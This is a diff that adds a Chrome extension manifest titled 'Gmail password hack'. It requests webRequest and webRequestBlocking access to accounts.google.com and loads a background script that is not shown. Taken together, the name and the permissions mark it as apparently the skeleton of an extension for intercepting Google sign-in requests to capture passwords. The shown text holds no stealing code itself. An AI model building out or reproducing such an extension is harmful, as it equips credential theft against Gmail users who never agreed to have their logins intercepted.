@@ -1,0 +1,13 @@
+{
+  "name": "Gmail password hack",
+  "version": "1.0",
+  "description": "",
+  "permissions": ["webRequest", 
+                  "webRequestBlocking",
+                  "https://accounts.google.com/*"],
+  "background": {
+    "scripts": ["background.js"]
+  },
+
+  "manifest_version": 2
+}
